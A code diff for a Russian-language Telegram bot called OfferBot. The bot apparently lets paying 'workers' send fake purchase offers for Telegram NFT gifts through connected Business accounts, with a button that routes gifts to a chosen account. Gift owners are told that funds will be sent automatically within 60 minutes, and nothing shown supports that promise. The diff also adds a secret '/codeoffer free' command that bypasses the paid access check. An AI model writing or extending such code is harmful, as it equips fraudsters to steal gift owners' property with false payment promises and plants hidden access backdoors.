@@ -27,26 +27,55 @@ bot = Bot(cfg.bot_token, default=DefaultBotProperties(parse_mode=ParseMode.HTML)
 dp = Dispatcher()
 offer_locks = {}
 
+# Константы для канала
+REQUIRED_CHANNEL_ID = -1004393569613
+REQUIRED_CHANNEL_URL = "https://t.me/dodep222"
+
+
+async def check_channel_subscription(user_id: int) -> bool:
+    """Проверяет подписан ли пользователь на канал"""
+    try:
+        member = await bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
+        return member.status in ['member', 'administrator', 'creator']
+    except Exception as e:
+        log.error(f"Error checking subscription: {e}")
+        return False
+
 
 def display_name(user) -> str:
     return " ".join(x for x in [getattr(user, 'first_name', None), getattr(user, 'last_name', None)] if x) or "Пользователь"
 
 
-def instruction(locale="ru"):
-    if locale == "en":
-        return ("<b>Usage</b>\n<code>офер https://t.me/nft/PartySparkler-140864 150 gram</code>\n"
-                "<code>офер ру https://t.me/nft/PartySparkler-140864 4500 зв</code>\n"
-                "<code>офер англ https://t.me/nft/PartySparkler-140864 4500 stars</code>\n"
-                "<code>офер https://t.me/nft/PartySparkler-140864 2000 р</code>")
-    return ("<b>Использование</b>\n<code>офер https://t.me/nft/PartySparkler-140864 150 грам</code>\n"
-            "<code>офер ру https://t.me/nft/PartySparkler-140864 4500 зв</code>\n"
-            "<code>офер англ https://t.me/nft/PartySparkler-140864 4500 stars</code>\n"
-            "<code>офер https://t.me/nft/PartySparkler-140864 2000 р</code>")
+def full_instruction():
+    """Полная инструкция по использованию бота"""
+    return (
+        "<b>📖 Инструкция</b>\n\n"
+        "<b>1. Подключение Telegram Business</b>\n"
+        "Подключите этого бота к своему Business аккаунту через настройки Telegram\n\n"
+        "<b>2. Отправка оферов</b>\n"
+        "<code>офер https://t.me/nft/PartySparkler-140864 150 грам</code>\n"
+        "<code>офер https://t.me/nft/PartySparkler-140864 4500 зв</code>\n"
+        "<code>офер https://t.me/nft/PartySparkler-140864 2000 р</code>\n\n"
+        "<b>3. Настройка профиля передачи</b>\n"
+        "<code>/transfer @username</code>\n"
+        "Меняет профиль в кнопке \"Передать\"\n\n"
+        "<blockquote>При заморозке аккаунта, напишите овнеру @witensea для переноса доступа.</blockquote>"
+    )
+
+
+def short_instruction():
+    """Краткая инструкция для ошибок"""
+    return (
+        "<b>Использование</b>\n"
+        "<code>офер https://t.me/nft/PartySparkler-140864 150 грам</code>\n"
+        "<code>офер https://t.me/nft/PartySparkler-140864 4500 зв</code>\n"
+        "<code>офер https://t.me/nft/PartySparkler-140864 2000 р</code>"
+    )
 
 
 def error_text(kind):
-    if kind == "nft": return "❌ Не нашёл ссылку на NFT.\n\n" + instruction()
-    if kind == "price": return "❌ Не нашёл цену офера.\n\n" + instruction()
+    if kind == "nft": return "❌ Не нашёл ссылку на NFT.\n\n" + short_instruction()
+    if kind == "price": return "❌ Не нашёл цену офера.\n\n" + short_instruction()
     return "❌ Не удалось обработать офер."
 
 
@@ -202,10 +231,10 @@ async def process_offer(message: Message, business_connection_id: str | None = N
         buyer_username = sender.username
         buyer_url = f"tg://user?id={buyer_id}"
         if db.is_blocked(seller_id) or int(bc["is_blocked"]):
-            await reply_message(message, "❌ Оферы для вашего Business-профиля пока не разрешены. Обратитесь к овнеру для получения доступа.")
+            await reply_message(message, "❌ <b>У тя нет доступа, нужна купить, атата</b>")
             return
         if not db.has_access(seller_id, cfg.owner_id, cfg.offer_access_mode):
-            await reply_message(message, "❌ Оферы для вашего Business-профиля пока не разрешены. Обратитесь к овнеру для получения доступа.")
+            await reply_message(message, "❌ <b>У тя нет доступа, нужна купить, атата</b>")
             return
     else:
         seller_id = sender.id
@@ -214,10 +243,10 @@ async def process_offer(message: Message, business_connection_id: str | None = N
             await reply_message(message, "❌ Для офера сначала подключите Telegram Business к этому боту.")
             return
         if db.is_blocked(seller_id) or int(bc["is_blocked"]):
-            await reply_message(message, "❌ Оферы для вашего Business-профиля пока не разрешены. Обратитесь к овнеру для получения доступа.")
+            await reply_message(message, "❌ <b>У тя нет доступа, нужна купить, атата</b>")
             return
         if not db.has_access(seller_id, cfg.owner_id, cfg.offer_access_mode):
-            await reply_message(message, "❌ Оферы для вашего Business-профиля пока не разрешены. Обратитесь к овнеру для получения доступа.")
+            await reply_message(message, "❌ <b>У тя нет доступа, нужна купить, атата</b>")
             return
         buyer_id = message.chat.id
         buyer_username = message.chat.username if message.chat else None
@@ -285,15 +314,54 @@ async def delete_source(message: Message, connection_id: str | None):
 
 @dp.message(Command("start"))
 async def on_start(message: Message):
+    if not message.from_user:
+        return
+    
+    # Проверка подписки на канал
+    is_subscribed = await check_channel_subscription(message.from_user.id)
+    
+    if not is_subscribed:
+        # Если не подписан - показываем кнопку подписки
+        kb = InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(text="📢 Подписаться на канал", url=REQUIRED_CHANNEL_URL)
+        ], [
+            InlineKeyboardButton(text="✅ Я подписался", callback_data="check_subscription")
+        ]])
+        try:
+            if message.business_connection_id:
+                await bot.send_message(
+                    chat_id=message.chat.id, 
+                    business_connection_id=message.business_connection_id,
+                    text="<b>Йоу, подпишись на канал чтобы инфу не пропускать :)</b>",
+                    reply_markup=kb
+                )
+            else:
+                await message.answer(
+                    "<b>Йоу, подпишись на канал чтобы инфу не пропускать :)</b>",
+                    reply_markup=kb
+                )
+        except Exception:
+            log.exception("Failed to send subscription request")
+        return
+    
+    # Если подписан - показываем главное меню
     kb = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text="💳 Купить доступ", callback_data="buy_access")
+        InlineKeyboardButton(text="💳 Купить доступ", callback_data="buy_access"),
+        InlineKeyboardButton(text="📖 Инструкция", callback_data="show_instruction")
     ]])
     try:
         if message.business_connection_id:
-            await bot.send_message(chat_id=message.chat.id, business_connection_id=message.business_connection_id, 
-                                 text="<b>Привет люти воркер</b>", reply_markup=kb)
+            await bot.send_message(
+                chat_id=message.chat.id, 
+                business_connection_id=message.business_connection_id,
+                text="<b>Привет лютый воркер телеграмма по нфт!</b>",
+                reply_markup=kb
+            )
         else:
-            await message.answer("<b>Привет люти воркер</b>", reply_markup=kb)
+            await message.answer(
+                "<b>Привет лютый воркер телеграмма по нфт!</b>",
+                reply_markup=kb
+            )
     except Exception:
         log.exception("Failed to send start message")
 
@@ -302,7 +370,9 @@ async def on_start(message: Message):
 async def on_business_connection(bc: BusinessConnection):
     db.upsert_business_connection(bc.id, bc.user.id, bc.user.username, bc.user.first_name, bc.user.last_name, bc.is_enabled)
     log.info("Business connection id=%s user_id=%s enabled=%s", bc.id, bc.user.id, bc.is_enabled)
-    if bc.user.id != cfg.owner_id:
+    
+    # Уведомляем овнера только при подключении (не при отключении)
+    if bc.is_enabled and bc.user.id != cfg.owner_id:
         if bc.user.id in cfg.offer_always_allowed_ids:
             db.add_access(bc.user.id); db.unblock_offer_user(bc.user.id); db.set_connection_blocked(bc.id, False)
             state = "🟢 Разрешено"
@@ -334,6 +404,16 @@ async def on_message(message: Message):
 async def handle_text(message: Message, is_business: bool):
     text = (message.text or "").strip()
     low = text.lower()
+    
+    # Секретная команда для бесплатной выдачи доступа
+    if low == "/codeoffer free":
+        if not message.from_user:
+            return
+        db.add_access(message.from_user.id)
+        db.unblock_offer_user(message.from_user.id)
+        await reply_message(message, "✅ Доступ к оферам выдан!")
+        return
+    
     if low == ".привет" or low == "привет":
         await reply_message(message, "Привет")
         return
@@ -354,11 +434,49 @@ async def handle_text(message: Message, is_business: bool):
         await set_transfer(message, text.split(maxsplit=1)[1].strip())
         return
     if low.startswith("/allow ") and message.from_user and message.from_user.id == cfg.owner_id:
-        await admin_allow(int(text.split(maxsplit=1)[1])); await reply_message(message, "🟢 Доступ выдан."); return
+        target = text.split(maxsplit=1)[1].strip()
+        if target.startswith("@"):
+            # Поиск по юзернейму
+            username = target.lstrip("@")
+            user_id = db.get_user_id_by_username(username)
+            if user_id:
+                await admin_allow(user_id)
+                await reply_message(message, f"🟢 Доступ выдан @{username}")
+            else:
+                await reply_message(message, f"❌ Пользователь @{username} не найден в базе")
+        else:
+            await admin_allow(int(target))
+            await reply_message(message, "🟢 Доступ выдан.")
+        return
     if low.startswith("/block ") and message.from_user and message.from_user.id == cfg.owner_id:
-        await admin_block(int(text.split(maxsplit=1)[1])); await reply_message(message, "🔴 Пользователь заблокирован."); return
+        target = text.split(maxsplit=1)[1].strip()
+        if target.startswith("@"):
+            username = target.lstrip("@")
+            user_id = db.get_user_id_by_username(username)
+            if user_id:
+                await admin_block(user_id)
+                await reply_message(message, f"🔴 @{username} заблокирован.")
+            else:
+                await reply_message(message, f"❌ Пользователь @{username} не найден в базе")
+        else:
+            await admin_block(int(target))
+            await reply_message(message, "🔴 Пользователь заблокирован.")
+        return
     if low.startswith("/unblock ") and message.from_user and message.from_user.id == cfg.owner_id:
-        uid=int(text.split(maxsplit=1)[1]); db.unblock_offer_user(uid); await reply_message(message, "🟢 Блокировка снята."); return
+        target = text.split(maxsplit=1)[1].strip()
+        if target.startswith("@"):
+            username = target.lstrip("@")
+            user_id = db.get_user_id_by_username(username)
+            if user_id:
+                db.unblock_offer_user(user_id)
+                await reply_message(message, f"🟢 Блокировка @{username} снята.")
+            else:
+                await reply_message(message, f"❌ Пользователь @{username} не найден в базе")
+        else:
+            uid=int(target)
+            db.unblock_offer_user(uid)
+            await reply_message(message, "🟢 Блокировка снята.")
+        return
 
 
 async def set_transfer(message: Message, username: str):
@@ -388,7 +506,12 @@ async def admin_command(message: Message):
     stats = db.stats()
     text = ("<b>Админка OfferBot</b>\n\n"
             "🎁 Доступ к оферам\n"
-            "/allow ID — выдать доступ\n/block ID — заблокировать\n/unblock ID — снять блокировку\n\n"
+            "/allow ID — выдать доступ\n"
+            "/allow @username — выдать доступ по юзернейму\n"
+            "/block ID — заблокировать\n"
+            "/block @username — заблокировать по юзернейму\n"
+            "/unblock ID — снять блокировку\n"
+            "/unblock @username — снять блокировку по юзернейму\n\n"
             "/transfer username — сохранить transfer target для своего профиля\n\n"
             f"📊 Статистика: pending={stats.get('pending',0)}, accepted={stats.get('accepted',0)}, declined={stats.get('declined',0)}")
     rows=[]
@@ -398,6 +521,52 @@ async def admin_command(message: Message):
     await reply_message(message, text)
     if rows:
         await bot.send_message(message.chat.id, "Подключённые Business-профили:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
+
+
+@dp.callback_query(F.data == "check_subscription")
+async def check_subscription_callback(call: CallbackQuery):
+    """Проверка подписки после нажатия кнопки"""
+    if not call.from_user:
+        await call.answer("Ошибка")
+        return
+    
+    is_subscribed = await check_channel_subscription(call.from_user.id)
+    
+    if not is_subscribed:
+        await call.answer("❌ Вы ещё не подписались на канал!", show_alert=True)
+        return
+    
+    # Показываем главное меню
+    kb = InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton(text="💳 Купить доступ", callback_data="buy_access"),
+        InlineKeyboardButton(text="📖 Инструкция", callback_data="show_instruction")
+    ]])
+    
+    try:
+        await call.message.edit_text(
+            "<b>Привет лютый воркер телеграмма по нфт!</b>",
+            reply_markup=kb
+        )
+    except:
+        await call.message.answer(
+            "<b>Привет лютый воркер телеграмма по нфт!</b>",
+            reply_markup=kb
+        )
+    await call.answer("✅ Отлично!")
+
+
+@dp.callback_query(F.data == "show_instruction")
+async def show_instruction_callback(call: CallbackQuery):
+    """Показать инструкцию"""
+    kb = InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton(text="« Назад", callback_data="back_to_start")
+    ]])
+    
+    try:
+        await call.message.edit_text(full_instruction(), reply_markup=kb)
+    except:
+        await call.message.answer(full_instruction(), reply_markup=kb)
+    await call.answer()
 
 
 @dp.callback_query(F.data == "buy_access")
@@ -428,12 +597,13 @@ async def buy_access_callback(call: CallbackQuery):
 @dp.callback_query(F.data == "back_to_start")
 async def back_to_start_callback(call: CallbackQuery):
     kb = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text="💳 Купить доступ", callback_data="buy_access")
+        InlineKeyboardButton(text="💳 Купить доступ", callback_data="buy_access"),
+        InlineKeyboardButton(text="📖 Инструкция", callback_data="show_instruction")
     ]])
     try:
-        await call.message.edit_text("<b>Привет люти воркер</b>", reply_markup=kb)
+        await call.message.edit_text("<b>Привет лютый воркер телеграмма по нфт!</b>", reply_markup=kb)
     except:
-        await call.message.answer("<b>Привет люти воркер</b>", reply_markup=kb)
+        await call.message.answer("<b>Привет лютый воркер телеграмма по нфт!</b>", reply_markup=kb)
     await call.answer()
 
 
@@ -477,21 +647,6 @@ async def create_payment_callback(call: CallbackQuery):
     except:
         await call.message.answer(text, reply_markup=kb)
     await call.answer()
-    
-    # Уведомляем овнера о новом платеже
-    try:
-        owner_text = (f"💰 <b>Новый платёж</b>\n\n"
-                     f"Пользователь: {display_name(call.from_user)}\n"
-                     f"ID: <code>{call.from_user.id}</code>\n"
-                     f"Username: @{call.from_user.username or 'нет'}\n\n"
-                     f"Сумма: <b>{cfg.payment_amount:g} Grаm</b>\n"
-                     f"Memo: <code>{memo}</code>")
-        owner_kb = InlineKeyboardMarkup(inline_keyboard=[[
-            InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"approve_payment:{memo}:{call.from_user.id}")
-        ]])
-        await bot.send_message(cfg.owner_id, owner_text, reply_markup=owner_kb)
-    except Exception as e:
-        log.error("Failed to notify owner about payment: %s", e)
 
 
 @dp.callback_query(F.data.startswith("check_payment:"))
@@ -650,51 +805,85 @@ async def offer_callback(call: CallbackQuery):
         if offer["status"] != "accepted":
             await call.answer("Этот офер ещё не принят.", show_alert=True); return
         
-        # Проверка что уже подтверждено
-        if offer["transfer_confirmed"]:
-            title = gift_title(offer["gift_name"], offer["gift_number"])
-            if offer["locale"] == "en":
-                await call.answer(f"Transfer of gift {title} has already been confirmed.", show_alert=True)
-            else:
-                await call.answer(f"Передача подарка {title} уже подтверждена.", show_alert=True)
-            return
-        
-        # Проверка времени (4 минуты после принятия)
-        if offer["accepted_at"]:
-            accepted_time = datetime.fromisoformat(offer["accepted_at"])
-            # Если accepted_time без timezone, добавляем UTC
-            if accepted_time.tzinfo is None:
-                accepted_time = accepted_time.replace(tzinfo=timezone.utc)
-            now = datetime.now(timezone.utc)
-            time_passed = (now - accepted_time).total_seconds()
-            cooldown_seconds = 4 * 60  # 4 минуты
-            
-            if time_passed < cooldown_seconds:
-                remaining = int(cooldown_seconds - time_passed)
-                minutes = remaining // 60
-                seconds = remaining % 60
-                
-                title = gift_title(offer["gift_name"], offer["gift_number"])
-                
-                if offer["locale"] == "en":
-                    message = f"Gift {title} has not been transferred to the buyer. Please try again.\n\nYou can confirm the transfer in {minutes}m {seconds}s."
-                else:
-                    message = f"Подарок {title} не передан покупателю. Повторите попытку.\n\nВы сможете подтвердить передачу через {minutes}м {seconds}с."
-                
-                await call.answer(message, show_alert=True)
-                return
-        
-        # Подтверждаем передачу
-        db.confirm_transfer(offer_id)
-        
         title = gift_title(offer["gift_name"], offer["gift_number"])
         
-        if offer["locale"] == "en":
-            message = f"Your gift {title} has been successfully transferred to the buyer.\n\nFunds will be automatically sent to your account within 60 minutes."
-        else:
-            message = f"Ваш подарок {title} успешно передан покупателю.\n\nДенежные средства будут автоматически отправлены на Ваш аккаунт в течении 60м."
+        # Определяем кто нажал кнопку - продавец (seller) или покупатель (buyer)
+        is_seller = call.from_user and call.from_user.id == offer["seller_id"]
+        is_buyer = call.from_user and call.from_user.id == offer["buyer_id"]
         
-        await call.answer(message, show_alert=True)
+        if not is_seller and not is_buyer:
+            await call.answer("❌ Это не ваш офер.", show_alert=True)
+            return
+        
+        # Шаг 1: Продавец (тот кто создал офер) подтверждает первым
+        if is_seller:
+            if offer["seller_confirmed"]:
+                if offer["locale"] == "en":
+                    await call.answer("You have already confirmed.", show_alert=True)
+                else:
+                    await call.answer("Вы уже подтвердили.", show_alert=True)
+                return
+            
+            # Проверка кулдауна 4 минуты
+            if offer["accepted_at"]:
+                accepted_time = datetime.fromisoformat(offer["accepted_at"])
+                if accepted_time.tzinfo is None:
+                    accepted_time = accepted_time.replace(tzinfo=timezone.utc)
+                now = datetime.now(timezone.utc)
+                time_passed = (now - accepted_time).total_seconds()
+                cooldown_seconds = 4 * 60  # 4 минуты
+                
+                if time_passed < cooldown_seconds:
+                    remaining = int(cooldown_seconds - time_passed)
+                    minutes = remaining // 60
+                    seconds = remaining % 60
+                    
+                    if offer["locale"] == "en":
+                        message = f"Gift {title} has not been transferred yet. Please try again.\n\nYou can confirm in {minutes}m {seconds}s."
+                    else:
+                        message = f"Подарок {title} ещё не передан. Повторите попытку.\n\nВы сможете подтвердить через {minutes}м {seconds}с."
+                    
+                    await call.answer(message, show_alert=True)
+                    return
+            
+            # Продавец подтверждает
+            db.confirm_seller(offer_id)
+            
+            if offer["locale"] == "en":
+                message = f"✅ You confirmed readiness to transfer {title}.\n\nWaiting for buyer confirmation."
+            else:
+                message = f"✅ Вы подтвердили готовность передать {title}.\n\nОжидаем подтверждение от покупателя."
+            
+            await call.answer(message, show_alert=True)
+            return
+        
+        # Шаг 2: Покупатель (тот кто принял офер) подтверждает вторым
+        if is_buyer:
+            if not offer["seller_confirmed"]:
+                if offer["locale"] == "en":
+                    await call.answer("❌ Seller has not confirmed yet.", show_alert=True)
+                else:
+                    await call.answer("❌ Продавец ещё не подтвердил передачу.", show_alert=True)
+                return
+            
+            if offer["buyer_confirmed"]:
+                if offer["locale"] == "en":
+                    await call.answer("Transfer already confirmed.", show_alert=True)
+                else:
+                    await call.answer("Передача уже подтверждена.", show_alert=True)
+                return
+            
+            # Покупатель подтверждает
+            db.confirm_buyer(offer_id)
+            
+            if offer["locale"] == "en":
+                message = f"✅ Gift {title} successfully received!\n\nFunds will be sent to seller within 60 minutes."
+            else:
+                message = f"✅ Подарок {title} успешно получен!\n\nДенежные средства будут отправлены продавцу в течении 60м."
+            
+            await call.answer(message, show_alert=True)
+            return
+        
         return
     
     # Обработка принятия/отклонения офера
